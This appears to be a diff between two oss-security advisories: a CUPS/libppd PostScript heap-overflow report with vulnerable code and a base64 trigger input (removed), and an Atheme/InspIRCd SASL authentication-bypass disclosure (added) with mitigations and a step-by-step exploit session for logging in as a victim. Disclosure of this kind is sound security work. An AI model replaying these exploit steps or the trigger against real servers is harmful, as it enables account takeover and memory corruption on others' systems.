@@ -1,4 +1,9 @@
-Received: (qmail 20421 invoked by uid 550); 20 Sep 2023 13:05:26 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["7225" "Sunday" "30" "January" "2022" "21:22:54" "+0000" "Ed Kellett" "e+ow@kellett.im" nil "172" "[oss-security] General authentication bypass in Atheme IRC services with InspIRCd 3" nil nil nil "1" nil nil (number mark "U       e+ow@kellett Jan 30  172/7225  " thread-indent "\"[oss-security] General authentication bypass in Atheme IRC services with InspIRCd 3\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] General authentication bypass in Atheme IRC services with InspIRCd 3" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 9701 invoked by uid 550); 30 Jan 2022 22:11:31 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,197 +12,191 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 14057 invoked from network); 20 Sep 2023 12:57:10 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
-	s=mimecast20190719; t=1695214618;
-	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
-	 to:to:cc:mime-version:mime-version:content-type:content-type;
-	bh=rqqU9Qnrpehb3xyW3b5MrOHXXWrtINRXbY8CLu8II2s=;
-	b=gkP+jCEgRWje9C11H0NrNeP7GjhLP3X6u3x9NPpXyzTcdtdQIWGrI6v1q0tiUKb5QX8npG
-	MrWi6RQYTshkXWSkmdhYjSqi1FFccc8lcqt+kFCHrmq/m6hxTovkLqvc/DpUtscCW9exc1
-	w0zprGTUe1YPRcDqs5d0bL16RKZaAp0=
-X-MC-Unique: 6sYZL92bNjSXsPbymmrpDQ-1
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20230601; t=1695214614; x=1695819414;
-        h=subject:from:to:content-language:user-agent:mime-version:date
-         :message-id:x-gm-message-state:from:to:cc:subject:date:message-id
-         :reply-to;
-        bh=rqqU9Qnrpehb3xyW3b5MrOHXXWrtINRXbY8CLu8II2s=;
-        b=ZwAJ9MObhn7oV1wVbMxbEGIBmEuLvLMmHod8E/BlEdHK+4DUm0XJdcd+psWxOKgIrD
-         48kIiauOTdePK44U4uNgS62GlBWcarSDJ3YGZE6jhkfzI0pE/vtuCKvgDDuc80deypc4
-         o6MLh66ryTkAMm6CFn0OpCE5C/Xf5qYR8hHC0nHIEdKUIsgUVznZYVLFowOfHVAd113O
-         1C54B+XT9oRXTsBu2ZwyWg+9EkDZNANu527/heSudukStmjKtQ3RbqERy1y9mo9C0s3f
-         VBZocvq9Zw8lPZm8wueocy+0HWDP+HBSFsfor12lI5l1JrMNxtGHZVtpxvje/7X3H7+4
-         mRVQ==
-X-Gm-Message-State: AOJu0YzE4KChe4CJHv0hwAm0QcoJVwW89UtnUatXfpX7iSO3cBGybKB8
-	bH/8+M9hE1WE/5l0epRZ+OTc2RKu7DmioP/nLxwFrFSJyOvDRyDes2vj3aNToCz36c+wtSlP7KQ
-	+lD85TqCnEGvQuo1Z3G0w5LDzSmiK9KtBTONbL3/R1map7Kq/HgrwAnUKWVg1znPrki7PvxJEFU
-	1/itPnBJXdXis=
-X-Received: by 2002:a17:906:220f:b0:9ad:7e21:2ce with SMTP id s15-20020a170906220f00b009ad7e2102cemr2152185ejs.1.1695214614087;
-        Wed, 20 Sep 2023 05:56:54 -0700 (PDT)
-X-Google-Smtp-Source: AGHT+IHCJVIUJ8auxo9vYfxvt7zZ6qWgENd47cqyuNLAEAGnxmz879viuUHZ8paWaG7VTNPVMYmVwA==
-X-Received: by 2002:a17:906:220f:b0:9ad:7e21:2ce with SMTP id s15-20020a170906220f00b009ad7e2102cemr2152169ejs.1.1695214613604;
-        Wed, 20 Sep 2023 05:56:53 -0700 (PDT)
-Message-ID: <f09b6919-97dc-a406-e6c4-add189505d48@redhat.com>
-Date: Wed, 20 Sep 2023 14:56:51 +0200
+Received: (qmail 24220 invoked from network); 30 Jan 2022 21:23:03 -0000
+Message-ID: <fdc7e8a1-b4a3-9ab9-89c7-6f56a424336a@kellett.im>
+DKIM-Signature: v=1; a=rsa-sha256; c=simple/simple; d=kellett.im; s=mail;
+	t=1643577771; bh=NS3+rW5bn0u0n2hU1/hFSECtuBmwGOYvaHZAvVcoKnQ=;
+	h=Date:From:To:Subject:From;
+	b=GghupxP6bOv+dKIFqTTMnD0UrYRK/r6uLZgdjW9Kl8godO3pwCUNA4+logO4Sq5yO
+	 rXRDpHp25bDxyOh2RKQ613XoYmtA+0OUd3NlbteOcK+ydo0Bn1sp+dSFInpZQEx5AR
+	 HR4eVxDpf3wBV+Noa5qhd9BUh8JilqtSe4qAGnR0=
+Date: Sun, 30 Jan 2022 21:22:54 +0000
 MIME-Version: 1.0
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101
- Thunderbird/102.13.0
+From: Ed Kellett <e+ow@kellett.im>
 To: oss-security@lists.openwall.com
-From: Zdenek Dohnal <zdohnal@redhat.com>
-X-Mimecast-Spam-Score: 0
-X-Mimecast-Originator: redhat.com
-Content-Type: multipart/alternative;
- boundary="------------owWTFMig2a5HUTmwMFAlQWTE"
-Content-Language: en-US
-Subject: [oss-security] CVE-2023-4504 cups, libppd: Postscript parsing heap-based buffer
- overflow
-
---------------owWTFMig2a5HUTmwMFAlQWTE
 Content-Type: text/plain; charset=UTF-8; format=flowed
 Content-Transfer-Encoding: 7bit
+Subject: [oss-security] General authentication bypass in Atheme IRC services with InspIRCd 3
 
-Hi all,
+Hi,
 
-there is the same vulnerability in CUPS and libppd projects.
+An authentication bypass has been found in certain combinations of 
+InspIRCd and Atheme IRC Services. By abusing a mismatch of expectations 
+between Atheme and InspIRCd, an attacker can start a challenge-response 
+login and then end the IRC handshake in such a way that Atheme considers 
+it to have succeeded. On some Atheme versions, the target account does 
+not need to have challenge-response authentication enabled.
 
-The original CUPS report:
+# Vulnerable software
+
+This vulnerability arises from a combination of two pieces of software. 
+Neither is expected to be vulnerable as part of any other software stack.
+
+Atheme prior to commit 4e664c75d0b280a052eb[1] is vulnerable (the 
+potential for shenanigans was noted at the time of this commit, but the 
+combination with InspIRCd was not). This affects the following release 
+series:
+
+      - 7.1 (unsupported)
+      - 7.2 (fixed in 7.2.12)
+
+However, one of the following SASL authentication mechanisms must also 
+be enabled in order to exploit this vulnerability:
+
+      - ECDSA-NIST256P-CHALLENGE (available in versions 7.1, 7.2, master)
+      - SCRAM-SHA-* (available in master only)
+      - ECDH-X25519-CHALLENGE (available in master only)
+
+Atheme releases in the 7.2 series, and 7.2 and later development 
+versions, are vulnerable to the general attack. In Atheme 7.1 only 
+accounts with challenge-response authentication enabled can be targeted.
+
+The InspIRCd behaviour that enables this attack was introduced in commit 
+407b2e004cf66e442771[2] and reverted in 6703b8065ccaa0acb503[3]. This 
+affects the 3.x and 4.x release series.
+
+# Mitigation
+
+Unload all SASL modules that implement challenge-response authentication:
+
+      - /OS MODUNLOAD saslserv/scram
+      - /OS MODUNLOAD saslserv/ecdh-x25519-challenge
+      - /OS MODUNLOAD saslserv/ecdsa-nist256p-challenge
+
+Alternatively, upgrade Atheme 7.2 to 7.2.12, or upgrade Atheme master to 
+commit 4e664c75d0b280a052eb (or later), and restart services.
+
+# Analysis
+
+Ignoring other features and trivial permutations, a challenge-response 
+login to IRC should look like this (this example is for the SCRAM-SHA-1 
+mechanism, taken from RFC 5802 Section 5, but a similar flow is also 
+used in the other mechanisms):
+
+      C->S: CAP REQ :sasl
+      C->S: USER alice 8 * :alice
+      C->S: NICK alice
+      S->C: :irc.example.net CAP * ACK :sasl
+      C->S: AUTHENTICATE :SCRAM-SHA-1
+      S->C: AUTHENTICATE :+
+      C->S: AUTHENTICATE :biwsbj11...a3hkYXdM
+      S->C: AUTHENTICATE :cj1meWtv...NDA5Ng==
+      C->S: AUTHENTICATE :Yz1iaXdz...NFRzPQ==
+      S->C: AUTHENTICATE :dj1ybUY5...a0ZzS1E9
+      C->S: AUTHENTICATE :+
+      S->C: :irc.example.net 900 alice alice!~alice@bar.example.org user 
+:You are now logged in as user
+      S->C: :irc.example.net 903 alice :SASL authentication successful
+      C->S: CAP END
+      S->C: :irc.example.net 001 alice :Welcome to the Example Internet 
+Relay Chat Network alice
+
+Since the username to authenticate against (given in the second 
+client-to-server AUTHENTICATE message) is needed to look up the 
+challenge materials, it is remembered by Atheme for the duration of the 
+authentication flow. Due to the mechanics of IRC server-to-server 
+protocols, a successful authentication must be remembered too, so that 
+the client can be considered logged in by Atheme once it completes the 
+handshake and is introduced to the network.
+
+Unfortunately, prior to 4e664c75d0b280a052eb, the storage for a pending 
+authentication and a successful authentication are one and the same. 
+Atheme does not know whether it has validated an authentication flow, 
+but relies on the IRCd to abort SASL authentication if it is in progress 
+when the handshake ends. On InspIRCd, which does not do this, an 
+attacker can simply end the handshake as soon as she receives the 
+challenge, and Atheme will consider her to have logged in.
+
+SASL separates the concept of authentication identity ("authcid") and 
+authorization identity ("authzid"). An account with sufficient 
+privileges (in real use usually a technical account rather than a human 
+user) can use its own credentials, identified by its authcid, to log 
+into some other account, identified by the authzid. Atheme introduced 
+full support for this feature in version 7.2.
+
+In the exploit scenario Atheme accepts the supplied identities without 
+question, and will not even check that the authcid account has the right 
+to impersonate the authzid. An attacker can therefore simply set authcid 
+to an account name that is known to enable challenge-response 
+authentication and authzid to the account name of the victim. There is 
+nothing the victim can do to avoid this.
+
+# Exploitation
+
+In order to exploit this vulnerability, we need an account with 
+challenge-response authentication enabled, or a network that uses SASL 
+SCRAM (which requires no special setup on the part of the attacker). If 
+we want to use a mechanism other than SCRAM, we can simply enable 
+challenge-response authentication for our own account with a SET command:
+
+      C->S: USER evil 8 * :evil
+      C->S: NICK evil
+      C->S: NS REGISTER hunter2 foo@baz.example.com
+      C->S: NS SET X25519-PUBKEY 
+LQDwvl3ECsZh/mXXKuwMw56inOOO/iW1tGOgYy64+lg=
+
+Then, in a new session, use that account to get into an account of our 
+choice. To prepare, encode the name of our account and our victim's like 
+this:
+
+      $ printf '%s\0%s' 'evil' 'alice' | base64 -w0
+      ZXZpbABhbGljZQ==
+
+Start logging in, and then interrupt the authentication flow with CAP END:
+
+      C->S: CAP REQ :sasl
+      C->S: USER evil 8 * :evil
+      C->S: NICK evil
+      S->C: :irc.example.net CAP * ACK :sasl
+      C->S: AUTHENTICATE :ECDH-X25519-CHALLENGE
+      S->C: AUTHENTICATE :+
+      C->S: AUTHENTICATE :ZXZpbABhbGljZQ==
+      S->C: AUTHENTICATE :1gVR5CbC...unw2hHyA
+      C->S: CAP END
+      S->C: :irc.example.net 001 evil :Welcome to the Example Internet 
+Relay Chat Network evil
+      [...]
+      S->C: :saslserv!saslserv@services.example.net NOTICE evil :Last 
+login from: [...] on [...].
+
+ From Atheme's point of view, we are now logged in as "alice". The IRCd 
+disagrees, and so, for example, we could not immediately gain access to 
+channels that only alice is allowed to join, but we can fix that in any 
+number of ways (such as by changing the victim's account name, or adding 
+new credentials to the victim's account and opening a new connection 
+using them).
+
+Note that nothing we sent depended on the server's responses; this 
+attack takes no intelligence to execute. This also works for 
+ECDSA-NIST256P-CHALLENGE and SCRAM-* in much the same way. Also, for 
+Atheme 7.1, SASL's authorization ID is ignored, so only victims with 
+challenge-response authentication already enabled are vulnerable.
+
+# Acknowledgements
+
+Aaron Jones (amdj) of Atheme assisted with the proof-of-concept 
+exploitation and preparation of this report, and took great pains to 
+ensure affected installations were notified.
 
 
-  CVE-2023-4504: OpenPrinting CUPS Postscript Parsing Heap Overflow
+Thanks,
+Ed Kellett
 
-AHA! <https://takeonme.org/> has discovered an issue with CUPS from 
-OpenPrinting, and is publishing
-this disclosure in accordance with AHA!'s standard disclosure policy 
-<https://takeonme.org/cve.html> today,
-on $DATE. CVE-2023-4504 <https://takeonme.org/cves/CVE-2023-4504.html> 
-has been assigned to this issue.
+---
 
-Any questions about this disclosure should be directed to
-*cve@takeonme.org*.
-
-
-  Executive Summary
-
-Due to failure in validating the length provided by an attacker-crafted 
-CUPS document, CUPS version v2.5b1 and prior, by default, is susceptible 
-to a heap-based buffer overflow, and possibly code execution. 
-CVE-2023-4504 <https://takeonme.org/cves/CVE-2023-4504.html> appears to 
-be an instance of CWE-122 
-<https://cwe.mitre.org/data/definitions/122.html>, a heap-based buffer 
-overflow.
-
-
-  Technical Details
-
-The |scan_ps| function in the CUPS codebase provides functionality that 
-scans through a string looking for the next Postscript object. When 
-iterating through a string which contains an open parenthesis and ends 
-with a single backslash (0x5c) character, the code incorrectly iterates 
-forward a character without properly checking the bounds of the string 
-resulting in a 1 byte read beyond the allocated heap buffer.
-
-Snippet of the vulnerable code:
-
-cups/cups/raster-interpret.c
-
-|1039 static _cups_ps_obj_t * /* O - New object or NULL on EOF */ 1040 
-scan_ps(_cups_ps_stack_t *st, /* I - Stack */ 1041 char **ptr) /* IO - 
-String pointer */ 1042 { ... 1085 switch (*cur) 1086 { 1087 case '(' : 
-/* (string) */ 1088 obj.type = CUPS_PS_STRING; 1089 start = cur; 1090 
-1091 for (cur ++, parens = 1, valptr = obj.value.string, 1092 valend = 
-obj.value.string + sizeof(obj.value.string) - 1; 1093 *cur; 1094 cur ++) 
-1095 { 1096 if (*cur == ')' && parens == 1) 1097 break; 1098 1099 if 
-(*cur == '(') 1100 parens ++; 1101 else if (*cur == ')') 1102 parens --; 
-1103 1104 if (valptr >= valend) 1105 { 1106 *ptr = start; 1107 1108 
-return (NULL); 1109 } 1110 1111 if (*cur == '\\') 1112 { 1113 /* 1114 * 
-Decode escaped character... 1115 */ 1116 1117 cur ++; 1118 1119 if (*cur 
-== 'b') 1120 *valptr++ = '\b'; 1121 else if (*cur == 'f') 1122 *valptr++ 
-= '\f'; 1123 else if (*cur == 'n') 1124 *valptr++ = '\n'; 1125 else if 
-(*cur == 'r') 1126 *valptr++ = '\r'; 1127 else if (*cur == 't') 1128 
-*valptr++ = '\t'; 1129 else if (*cur >= '0' && *cur <= '7') 1130 { 1131 
-int ch = *cur - '0'; 1132 1133 if (cur[1] >= '0' && cur[1] <= '7') 1134 
-{ 1135 cur ++; 1136 ch = (ch << 3) + *cur - '0'; 1137 } 1138 1139 if 
-(cur[1] >= '0' && cur[1] <= '7') 1140 { 1141 cur ++; 1142 ch = (ch << 3) 
-+ *cur - '0'; 1143 } 1144 1145 *valptr++ = (char)ch; 1146 } 1147 else if 
-(*cur == '\r') 1148 { 1149 if (cur[1] == '\n') 1150 cur ++; 1151 } 1152 
-else if (*cur != '\n') 1153 *valptr++ = *cur; 1154 } 1155 else 1156 
-*valptr++ = *cur; 1157 } |
-
-Line 1085 contains the case statement which provides the logic used to 
-iterate through the given string.
-
-On line 1091, the for loop within the case statement is used to iterate 
-through each character after encountering an open paranthesis character 
-(0x28), storing the pointer to the current character in |cur|.
-
-On line 1111, the code checks if the current character is a backslash 
-and finally, in line 1117, the character index is incremented without 
-checking the length, now pointing to the null byte terminating the string.
-
-Upon the next iteration of the loop, on line 1094, the loop now begins 
-iterating through unallocated memory resulting in undefined behaviour.
-
-A Base64 encoded blob of an example PostScript document that can trigger 
-the issue is below.
-
-|L///KFwAY3V1ZQ== |
-
-
-  Attacker Value
-
-By providing this malformed PostScript document, an attacker could 
-compromise the machine running the software. Once compromised, this can 
-provide an attacker a unique, privileged position in the targeted network.
-
-
-  Credit
-
-This issue is being disclosed through the AHA! CNA and is credited to: 
-zenofex <https://mastodon.social/@zenofex> and WanderingGlitch 
-<https://infosec.exchange/@WanderingGlitch>
-
-CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:N
-
-========================================================================================
-
-*Notes:*
-
-- I've tried to reproduce the issue with any filter and PPD using the 
-code, but I didn't get crash nor valgrind report - maybe ASAN could show 
-the vulnerability, but I haven't tried this.
-
-- the vulnerability should show up when you send the postscript string 
-above to a printer which requires cups-raster format (the vulnerable 
-code is in path when you convert postscript to raster), which is not 
-common these days - nor sending postscript or producing cups-raster.
-
-*Updated Notes:*
-
-I found out the vulnerability should happen only if malformed PostScript 
-sequence is in PPD file, not if the sequence is sent for printing 
-(vulnerable code was in library function used for reading PS sequence 
-which are in PPDs).
-
-*Commits fixing the issue:*
-
-cups: https://github.com/OpenPrinting/cups/commit/2431caddb7e6
-
-libppd: https://github.com/OpenPrinting/libppd/commit/262c909ac5
-
-
-Have a nice day,
-
-
-Zdenek Dohnal
-
-CUPS 2.4.x release manager
-
-
--- 
-Zdenek Dohnal
-Senior Software Engineer
-Red Hat, BRQ-TPBC
-
---------------owWTFMig2a5HUTmwMFAlQWTE--
-
+[1]: 
+https://github.com/atheme/atheme/commit/4e664c75d0b280a052eb8b5e81aa41944e593c52
+[2]: 
+https://github.com/inspircd/inspircd/commit/407b2e004cf66e442771ec5d2bbe700dee1f3760
+[3]: 
+https://github.com/inspircd/inspircd/commit/6703b8065ccaa0acb50380736f25780e3a8e549d
